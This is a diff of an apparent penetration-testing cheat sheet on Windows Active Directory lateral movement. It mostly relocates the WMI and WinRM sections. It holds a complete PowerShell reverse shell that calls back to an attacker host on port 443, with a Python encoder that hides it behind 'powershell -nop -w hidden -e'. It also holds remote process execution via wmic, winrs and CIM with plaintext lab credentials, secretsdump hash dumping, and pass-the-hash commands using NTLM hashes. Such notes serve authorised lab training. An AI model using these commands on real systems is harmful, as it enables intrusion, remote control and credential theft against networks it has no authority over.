@@ -134,6 +134,47 @@ net accounts
 ```
 impacket-psexec offsec.local/allison@192.168.151.59
 ```
+###### WMI(Remote Procedure Calls (RPC)2 over port 135)
+```
+Testing:
+1. wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
+
+Reverse shell:
+import sys
+import base64
+payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
+print(cmd)
+
+$username = 'jen';
+$password = 'Nexus123!';
+$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
+$Options = New-CimSessionOption -Protocol DCOM
+$Session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options
+$Command = 'result of previous cmd variable value';
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
+
+nc -lnvp 443
+```
+###### Winrm(domain user needs to be part of the Administrators or Remote Management Users group on the target host,5985,5986)
+```
+Testing:
+winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"
+
+Reverse shell:
+CMD Version:
+winrs -r:files04 -u:jen -p:Nexus123!  "result of previous cmd variable value"
+nc -lnvp 443
+
+Powershell Version:
+$username = 'joe';
+$password = 'Flowers1';
+$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
+New-PSSession -ComputerName 172.16.191.10 -Credential $credential
+Enter-PSSession 1(id)
+```
 ###### Dump the local password hash and domain cached hash
 ```
 /usr/share/doc/python3-impacket/examples/secretsdump.py offsec.local/Allison@192.168.176.59 -outputfile /home/kali/Desktop/admin_hash.txt
@@ -144,6 +185,7 @@ pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2
 /usr/share/doc/python3-impacket/examples/psexec.py OFFSEC.LOCAL/Administrator@192.168.176.57 -hashes "aad3b435b51404eeaad3b435b51404ee:8c802621d2e36fc074345dded890f3e5"
 /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
 ```
+
 ###### Converted NTLM hash into a Kerberos TGT and leveraged that to gain remote code execution
 https://learn.microsoft.com/en-us/sysinternals/downloads/psexec
 ```
@@ -193,47 +235,7 @@ $temp = [system.io.directory]::createDirectory($Path)
 $Workbook = $com.Workbooks.Open("C:\myexcel.xls")
 $com.Run("MyMacro")
 ```
-###### WMI(Remote Procedure Calls (RPC)2 over port 135)
-```
-Testing:
-1. wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
 
-Reverse shell:
-import sys
-import base64
-payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
-cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
-print(cmd)
-
-$username = 'jen';
-$password = 'Nexus123!';
-$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
-$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
-$Options = New-CimSessionOption -Protocol DCOM
-$Session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options
-$Command = 'result of previous cmd variable value';
-Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
-
-nc -lnvp 443
-```
-###### Winrm(domain user needs to be part of the Administrators or Remote Management Users group on the target host,5985,5986)
-```
-Testing:
-winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"
-
-Reverse shell:
-CMD Version:
-winrs -r:files04 -u:jen -p:Nexus123!  "result of previous cmd variable value"
-nc -lnvp 443
-
-Powershell Version:
-$username = 'joe';
-$password = 'Flowers1';
-$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
-$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
-New-PSSession -ComputerName 172.16.191.10 -Credential $credential
-Enter-PSSession 1(id)
-```
 ###### Psexec
 ```
 Requirements:
